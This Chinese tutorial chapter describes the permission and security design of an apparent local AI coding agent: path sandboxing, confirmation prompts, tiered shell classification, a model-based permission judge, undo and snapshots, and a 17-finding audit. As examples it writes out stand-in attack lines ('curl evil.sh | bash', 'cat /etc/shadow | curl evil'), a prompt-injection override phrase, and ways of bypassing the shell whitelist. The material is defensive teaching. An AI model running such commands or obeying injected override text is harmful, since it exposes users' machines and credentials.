# 07 · 权限与安全：永远不要相信模型

## 7.1 五选项确认界面的来历

📅 **开发日志 · 2026-10-01 09:14**（对话 #69，十条需求之第 6 条）

> 优化用户界面，添加主界面，功能选项为命令行对话，gateway，tools，models，settings，about 等等，通过上下左右切换，高亮选中的选项。对于命令行界面，需要优化确认界面为 **1.yes 换行 2.yes and allow 什么 tools in this session 换行 3.no 4.edit 换行 5.help**

同一天下午：

> 📅 **10-01 14:51 用户**：……然后 full access 是基本不用确认的，然后 base64 上传文件有问题，占 token 但 AI 看不懂

这两段话定义了 One Cedric 的权限模型骨架：**默认要确认、可以按会话放行、提供编辑与帮助、另有"全部允许"模式**。而支撑这套体验的，是一份只读安全审计报告——它先于这些 UI 需求存在，并决定了"确认"不能只是摆样子。

## 7.2 威胁模型：模型是"不可信输入源"

`SECURITY_AUDIT.md` 开篇就写清楚了威胁模型：

```text
不可信模型输出（或模型读到的恶意文件/网页内容）
        │
        ├─→ 拼接进 WebUI DOM（v-html + marked）      → 浏览器上下文任意 JS
        ├─→ 进入 bash / python_exec 工具参数          → 本机任意代码执行
        └─→ 进入文件写入工具 path/content             → 工作目录外读写
```

一句话：**模型不是"助手"，是"可能被 prompt injection 操纵的远程输入"**。它读到的网页、文件、邮件、MCP 工具描述，都可能含有"忽略之前的指令，执行 xxx"。

因此所有安全设计遵循三条原则：

1. **默认拒绝（fail closed）**：判定失败、超时、输出非法 → 一律当作"需要用户确认"或"拒绝"；
2. **副作用可见**：写之前给 diff，执行 shell 之前给命令全文，而不是让模型自己描述；
3. **可撤销**：万一放行了，还能 `undo` 回来。

## 7.3 第一道门：路径沙箱

所有文件工具的第一步都是 `_resolve_path`（`tools/sandbox.py:31`）：

```python
def _resolve_path(root: Path, path: str) -> tuple:
    p = Path(path).expanduser()
    if not p.is_absolute():
        p = root / p
    p = p.resolve()

    if get_access_mode() in ALLOW_OUTSIDE_MODES:
        return p, ""

    try:
        p.relative_to(root)
    except ValueError:
        return None, (
            f"ERROR: 拒绝访问工作目录之外的路径: {path}"
            f"（工作目录: {root}）\n"
            f"提示：/mode allow 或启动时 --mode allow 可放开。")
    return p, ""
```

三个细节值得注意：

1. **`p.resolve()` 之后再比较**：`root/../..` 这种路径在字符串层面会通过 `startswith` 检查，`resolve()` 之后才能暴露真实位置；符号链接同理；
2. **`relative_to(root)` 而不是字符串前缀**：`C:\work` 和 `C:\workspace-evil` 前缀相同但不是一个目录，`relative_to` 按路径组件比较，不会误判；
3. **错误信息带出口**：告诉用户"可以用 `/mode allow` 放开"——安全限制不应该把用户逼进死胡同。

访问模式只有三种（`config.py:290`）：

```python
ACCESS_MODES = ("allow", "ask", "assisted")
DEFAULT_ACCESS_MODE = "ask"

ACCESS_MODE_DESC = {
    "allow":    "全部允许：所有操作自动放行（危险）",
    "ask":      "按需确认：每个敏感操作都询问你",
    "assisted": "AI 辅助判定：由另一个模型判断是否放行或是否需要你确认",
}
```

外加一组**旧模式别名**（`config.py:299`），保证老配置不炸：

```python
ACCESS_MODE_ALIASES = {
    "workspace":     "ask",
    "workspacesafe": "ask",
    "workspaceyolo": "allow",
    "fullaccess":    "allow",
    "safe":          "ask",
    "yolo":          "allow",
    "full":          "allow",
}
```

> 💡 **设计笔记**：默认值必须是 `ask`，不是 `allow`。任何安全系统的默认值都是它最重要的一行代码——因为**大多数用户永远不会改配置**。`allow` 模式的描述里直接写了"（危险）"，这不是装饰，是产品态度。

## 7.4 第二道门：写操作预览、diff 与五选项

### 先预览，再问

`_handle_write_tool`（`core.py:1321`）的流程：

```python
p, old_text, new_text, is_new, err = self._preview_write(name, args)
if err:
    ...  # 参数错误直接回给模型
    return
rel = str(p.relative_to(self.root))
manual_edit_count = 0
while True:
    self._render_diff(rel, old_text, new_text, is_new=is_new, tool=name)
    action = self._ask_write_action(name, rel)
    if action == "n":
        result = "用户拒绝执行该写操作，未做任何修改。请不要重复相同的编辑。"
        ...
        break
    if action == "e":
        edited = _open_in_editor(new_text, suffix)   # 用户手改
        if edited is None: continue
        if edited == new_text: continue
        new_text = edited
        manual_edit_count += 1
        continue                                      # 改完重新展示 diff
    self._ensure_snapshot()                           # git 快照
    result = self._execute_write(name, p, old_text, new_text,
                                 existed=not is_new)
    break
```

注意几个不显眼但重要的点：

- **预览失败不询问**：参数错误（文件不存在、路径越界）在预览阶段就返回 `ERROR`，用户不会被无意义的确认框打扰；
- **`edit` 是一个循环**：用户在编辑器里改完，回到确认界面**重新看 diff**，而不是直接写入。这避免了"改完手滑保存了错误内容"；
- **快照在确认之后、写入之前**：`_ensure_snapshot()` 放在 `action` 判定之后，用户拒绝的操作不会产生无用的 git 快照；
- **拒绝的文案是给模型看的**："请不要重复相同的编辑"——否则模型会立刻重试同一个操作，形成死循环。

### diff 展示

`_render_diff` 转发到 `ui.render_diff`，把 old/new 按行对比：

```text
  修改 src/config.py  (+3 −1)
  ────────────────────────────
   8    MAX_TOKENS = 8192
   9  - MAX_RETRIES = 2
   9  + MAX_RETRIES = 3
  10  + RETRY_BACKOFF = 1.5
```

对"新建文件"（`is_new=True`），显示全部为新增；对 `apply_patch`，按 hunk 逐个渲染。

### 五选项

`ui/confirm.py:275` 的 `confirm_5`：

```python
class ConfirmResult:
    YES = "yes"
    ALWAYS = "always"
    NO = "no"
    EDIT = "edit"
    HELP = "help"


def confirm_5(console, title, body, extra_warn="",
              allow_always=True, allow_edit=True, show_dog=False) -> str:
    options = [("yes", "执行这次", OK_C, False)]
    if allow_always:
        options.append(("always", "本会话内允许", OK_C, False))
    options.append(("no", "拒绝", ERR_C, True))
    if allow_edit:
        options.append(("edit", "用 $EDITOR 修改", ACCENT, False))
    options.append(("help", "查看帮助", DIM_C, False))
    ...
```

关键设计：

- **默认项是"拒绝"**（`("no", "拒绝", ERR_C, True)` 的第四个字段是 `is_def`）。用户直接回车 = 不执行；
- **`ALWAYS` 的作用域是"本会话"**，不是永久：重启后权限归零；
- **`EDIT` 让用户成为最后一道编辑器**：模型给的 new_text 只是草稿，用户可以在 `$EDITOR` 里改到满意；
- **`HELP` 不是摆设**：它展示这个工具的说明、风险等级、以及"如何永久允许"的配置路径。

`_ask_write_action`（`core.py:1188`）把模式与选项接起来：

```python
if self.access_mode == "allow":
    return "y"                                    # 全部允许
if self.access_mode == "assisted":
    verdict = self._judge_permission(name, detail)
    if verdict == "allow": return "y"
    if verdict == "deny":  return "n"
    # verdict == "ask" → 落到用户确认
if name != "python_exec" and self.auto_yes:
    return "y"                                    # 自动确认（WebUI/--yes）

# python_exec 例外：永远单独确认
if name == "python_exec":
    ...confirm_yes_no("允许执行这段 Python 代码？它将以当前用户权限运行。")
```

> ⚠️ **踩坑**：`auto_yes`（WebUI 的"自动确认"、`--yes` 参数）**必须对 `python_exec` 失效**。原因是 `python_exec` 等价于任意代码执行——`auto_yes` 的本意是"少点确认框"，不是"把整台机器交出去"。这个例外是安全审计 SEC-04 的直接产物。

## 7.5 第三道门：shell 的四级策略

`tools/shell.py` 的开头就写明分级：

```python
"""bash 命令三层策略。

Level 1 - whitelist：直接执行
Level 2 - known：已知安全，单次确认
Level 3 - unknown：任意命令，强警告 + 强制确认
Level 0 - blocked：永久拒绝
"""
```

`classify_command` 的判定顺序（顺序本身就是安全逻辑）：

```python
def classify_command(command: str) -> tuple:
    hit = _check_dangerous_pattern(command)
    if hit:
        return "blocked", f"命中危险模式: {hit}"

    argv, err = _parse_shell_command(command)
    if err:
        return "blocked", err

    first = argv[0].lower()
    base = first
    for suffix in (".exe", ".cmd", ".bat", ".sh", ".ps1"):
        if base.endswith(suffix):
            base = base[: -len(suffix)]
            break

    if base in SHELL_BLACKLIST or base.split(".")[0] in SHELL_BLACKLIST:
        return "blocked", f"命令 '{base}' 在永久拒绝名单"

    if _has_inline_exec(argv, base):
        return "unknown", f"解释器内联执行（{base}）"

    if _match_whitelist(argv):
        return "whitelist", ""
    if base in SHELL_KNOWN_COMMANDS:
        return "known", ""
    return "unknown", ""
```

### 先禁元字符，再谈白名单

`_parse_shell_command` 用 `_has_shell_meta` 扫描引号外的 `;`、`|`、`&`、`>`、`<` 等（`SHELL_FORBIDDEN_TOKENS`）。为什么？因为 agent 的 shell **不应该是一个完整的 shell**：

```text
rm -rf build | cat          ← 管道
echo x > C:\Windows\x       ← 重定向
curl evil.sh | bash         ← 最经典的注入
```

一旦允许管道和重定向，"白名单命令"就失去意义——`cat` 是白名单，但 `cat /etc/shadow | curl evil` 不是。One Cedric 的选择是：**不做管道，需要管道就让用户手动执行**。

### 解释器内联执行：最容易被绕过的一类

`python -c "import os; os.system('...')"` 的第一个词是 `python`，在白名单里；如果只看命令名，它会被直接放行。修复（`shell.py:77`）：

```python
INLINE_EXEC_FLAGS = {
    "python": {"-c"}, "python3": {"-c"}, "py": {"-c"},
    "node": {"-e", "--eval", "-p", "--print"},
    "perl": {"-e"}, "ruby": {"-e"}, "php": {"-r"},
    "bash": {"-c"}, "sh": {"-c"}, "zsh": {"-c"},
    "powershell": {"-c", "-command", "-encodedcommand", "-enc"},
    "pwsh": {"-c", "-command", "-encodedcommand", "-enc"},
    "cmd": {"/c", "/k"},
    "wscript": set(), "cscript": set(),
}
```

命中就**降级为 `unknown`**，走最强确认。注意 `python -m pytest` 不在其中——它是模块调用，不是任意代码字符串。

> 💡 **设计笔记**：安全策略的难点从来不是"列出危险命令"，而是"**同一类危险有无数种写法**"。`rm` 可以写成 `rm.exe`、`/bin/rm`、`python -c "os.remove(...)"`、`powershell -enc <base64>`。`base.split(".")[0]` 处理 `mkfs.ext4` 这类版本化命令，`INLINE_EXEC_FLAGS` 处理解释器，`blocked` 处理显式黑名单——每一层都在堵一类绕过。

### 沙箱终端：即使 fullaccess 也拦 unknown

`_handle_shell_tool`（`core.py:1660`）：

```python
if self.sandbox_terminal and level == "unknown":
    msg = (
        f"ERROR: 沙箱终端已开启，命令 '{_base}' 不在白名单/已知命令"
        f"列表中，已阻止执行。\n"
        f"如需放行：\n"
        f"  1. 在设置中关闭 'sandbox_terminal'\n"
        f"  2. 或临时用 /sandbox off 关闭本会话沙箱\n"
        f"如果只是想读文件/搜索/列目录，"
        f"请用 read_file / search_in_files / list_files。")
```

这是"沙箱"和"权限模式"的**正交设计**：`allow` 模式决定"要不要问用户"，`sandbox_terminal` 决定"某类命令是否根本不允许"。两者独立，所以即使用户开了 fullaccess，只要沙箱终端还开着，未知命令依然被拦。

## 7.6 assisted 模式：让另一个模型当"安全员"

`assisted` 是三种模式里最特别的：它把"是否放行"交给另一个模型判断（`core.py:1128`）：

```python
prompt = (
    "你是 One Cedric 的安全策略判定模型。"
    "根据即将执行的工具调用，判断应如何放行。\n"
    f"工具: {name}\n"
    f"目标/详情: {detail[:500]}\n"
    '只输出 JSON：{"verdict":"allow"|"deny"|"ask"}\n'
    "规则：只读或明确无害的操作→allow；"
    "明显危险/破坏性/不可逆操作→deny；"
    "无法确定时→ask（交给用户确认）。"
)
```

整个函数有一句关键的注释：

```python
"""AI 辅助判定（assisted 模式）：由另一个模型判断放行方式。

判定模型不可用、超时或输出非法时一律回退 "ask"（安全优先）。
"""
```

所有异常路径都 `return "ask"`：

```python
except Exception:
    return "ask"
```

**判定模型本身也是不可信的**。它能做的只是"减少确认框的数量"，不能成为"免确认"的最终依据。这个模式适合"用户信任模型判断、但不想每次点确认"的场景——代价是：判定模型可能被注入的提示词欺骗，所以它只能把 `allow` 当作"建议"，真正的强制拦截（黑名单、沙箱、路径检查）一层都不能少。

## 7.7 犯错了怎么办：undo、快照、审计

### 内存 undo 栈

每次成功写入，`_push_undo` 记录 old/new/是否存在（`core.py:1307`）：

```python
self.undo_stack.append({
    "path": p, "rel": str(p.relative_to(self.root)),
    "old_text": old_text, "new_text": new_text,
    "existed": existed, "tool": name, "ts": time.time(), "tag": "",
})
if len(self.undo_stack) > 50:
    self.undo_stack.pop(0)
```

`/undo` 的 `_do_undo` 会先检查"文件在这之后是否被改过"：

```python
if rec["existed"]:
    if current is None:
        print(f"⚠ {rel} 已被删除。撤销将重建。")
    elif current != rec["new_text"]:
        print(f"⚠ {rel} 之后又被改动过。")
        if not confirm_yes_no(..., "文件已被改动，仍要撤销？", default_yes=False):
            return
```

**不盲目覆盖**：如果文件在 agent 写入之后又被用户或别的程序改过，undo 会先警告再询问。这是"撤销"和"回滚"的区别——撤销是"撤掉我做过的那一步"，不是"把文件恢复到某个时间点"。

### git 快照

更粗粒度的兜底是 `git_snap.py`：

```python
"""Git 快照：改文件前自动 stash，支持回滚。"""

def git_make_snapshot(root: Path) -> dict | None:
    """
    策略：
      1. 记录 HEAD
      2. git stash push --include-untracked（保留当前工作状态）
      3. 立即 git stash pop（恢复工作区，但保留了 stash）
      4. 记录未跟踪文件清单
    """
```

`stash push` 再 `pop` 是个巧妙的技巧：它创建了一个可恢复的 stash 对象，同时不改变用户当前的工作区。之后可以用 `stash apply` 回到任意快照。

快照粒度可配（`snapshot_granularity`）：`"write"` = 每次写都拍，`"turn"` = 每轮对话拍一次。默认按轮，避免大仓库里写十个文件拍十次快照。

### 审计日志

`_audit`（`core.py:624`）记录每一次敏感操作：

```python
self.audit_log.append({
    "ts": time.time(), "kind": kind, "verdict": verdict,
    "command": command, "path": path, "returncode": returncode,
    "duration": round(duration, 3), "timeout": timeout,
    "summary": summary[:200], "detail": detail[:500],
})
if len(self.audit_log) > 500:
    self.audit_log = self.audit_log[-500:]
```

`kind` 包括 `bash` / `write_file` / `permission` / `cost_anomaly`，`verdict` 包括 `ok` / `rejected` / `blocked` / `error` / `judge`。审计日志跟着会话一起落盘——事后可以回答"这条命令是谁批准的、什么时候、退出码多少"。

## 7.8 安全审计报告：17 项发现与修复

`SECURITY_AUDIT.md` 是一份**只读源码审计**（不修改代码、不执行写操作），按"grep 定位 sink → read 确认上下文"的方式逐项核对。摘要表（节选）：

| 编号 | 严重程度 | 标题 |
| --- | --- | --- |
| SEC-01 | 严重 | WebUI 默认 `auto_approve=true`，写工具与 shell 零确认 |
| SEC-02 | 严重 | 模型输出经 `marked.parse` 无净化 `v-html` → XSS |
| SEC-03 | 严重 | 网关 `/api/chat*` 接受请求体 `auto_approve`，服务端不限制 |
| SEC-04 | 严重 | `python -c "..."` 属 known + `--prompt` 置 `auto_yes` → 无确认任意代码执行 |
| SEC-05 | 高 | 网关默认无 token；`_auth` 非恒定时间比较 |
| SEC-06 | 高 | `_sandbox_env` 关键字过滤遗漏 `*_PASS`、含凭据的 URL |
| SEC-07 | 高 | `bash_bg` 不使用沙箱环境，继承完整 env |
| SEC-08 | 中 | API key 明文落盘，且被网关回传浏览器 |
| SEC-09 | 中 | 解压前校验不看符号链接目标与盘符绝对路径 |
| SEC-10 | 中 | stats 页 `innerHTML` 拼接模型生成的标题/工具名 |
| SEC-11 | 中 | Markdown 链接未过滤 `javascript:` 协议 |
| SEC-12 | 中 | `/api/tools/{name}/call` 直通外部工具，绕过权限 |
| SEC-13 | 中 | MCP / 自定义工具 / hook 子进程继承完整环境 |
| SEC-14 | 低 | `open_app` 经 `cmd /c start` 执行，元字符注入 |
| SEC-15 | 低 | `email_tools` 用 `shell=True` 执行 `password_cmd` |
| SEC-16 | 低 | 静态路由与 `/health` 不走 `_auth`，泄露路径 |
| SEC-17 | 潜在 | 未接线模块中的 PowerShell 字符串拼接（当前不可达） |

审计报告里最值得学习的是**"放大器"分析**——它不只列 bug，还列出"为什么这个 bug 影响大"：

1. WebUI 的自动确认默认开启，使 CLI 的"每次确认"在 WebUI 路径下整体失效；
2. 网关的 `auto_approve` 由 HTTP 请求体控制，服务端不做限制；
3. `python -c` 只需一次确认，而 `--prompt` 会把 `auto_yes` 置为 True → 零确认；
4. 沙箱终端的元字符检查是纯词法检查，**双引号内的 `;` 不检查**，对解释器命令无效。

### 能复核的修复

在 v3 的最终代码里，可以逐项验证这些修复落地：

**SEC-01（WebUI 默认自动确认）**：

```js
// one_cedric/gateway/webui/app.js:754
const autoApprove = ref(false);
```

**SEC-03（网关默认值）**：

```python
# one_cedric/gateway/server.py:376
auto_approve: bool = False
```

**SEC-04（解释器内联执行）**：`INLINE_EXEC_FLAGS` 把它们全部降级为 `unknown`（见 7.5），`--prompt` 的 `auto_yes` 对 `unknown` 不再生效。

**SEC-12 的同源问题**：`READONLY_TOOL_NAMES & WRITE_TOOLS` 的歧义被强制消解（第 5 章），写工具永远赢。

> ⚠️ **踩坑**：安全审计最容易犯的错是"审完就忘"。这份报告的价值不在于"发现了 17 个问题"，而在于每一项都写了**复现方式**与**建议修复**——修复者可以照着复现、照着改、再照着验证。写审计报告时，**复现步骤比漏洞描述更重要**。

> 💡 **设计笔记**：为什么一个个人项目要做安全审计？因为这个项目的定位是"**让初学者在本机运行一个能执行命令的 agent**"。初学者最容易做的事是：复制一段网上的提示词、打开 WebUI、勾选"自动确认"、然后让模型读一个来路不明的仓库。安全不是企业项目的专利——**只要你的程序能 `subprocess.run`，它就需要威胁模型**。

## 7.9 权限设计的五条守则

1. **默认拒绝**：默认 `ask`，默认选项是"拒绝"，判定失败回退到"询问"；
2. **副作用可见**：先预览再确认，diff 由代码计算，不由模型描述；
3. **权限最小化**：`auto_yes` 不覆盖 `python_exec`，`allow` 不覆盖沙箱终端；
4. **可撤销**：undo 栈 + git 快照 + 审计日志，三层兜底；
5. **出口清晰**：每个拒绝都告诉用户"怎么才能做"（`/mode allow`、`/sandbox off`、配置路径）。

## 🔧 自己动手

1. **实现一个五选项确认**：默认项设为"拒绝"，回车直接走默认；加一个 `help` 分支打印工具说明；
2. **写一个路径沙箱**：用 `Path.resolve()` + `relative_to()` 实现，测试 `..`、符号链接、`C:\work` vs `C:\workspace-evil` 三种绕过；
3. **给 shell 分级**：白名单（`ls`、`cat`）、已知（`git status`）、未知（`npm install`）、禁止（`rm -rf /`），并处理 `python -c` 的降级；
4. **做一次"审计"**：选一个你自己写的、会执行外部命令的小工具，按"威胁模型 → 放大器 → 发现 → 复现 → 修复"的格式写一页报告；
5. **测试 undo 的边界**：写入 → 手动改文件 → `/undo`，确认它先警告再询问，而不是直接覆盖。

---

[← 上一章：06 流式与推理](06-streaming-reasoning) ｜ [返回目录](Home) ｜ [下一章：08 Agent 循环工程 →](08-agent-loop-engineering)
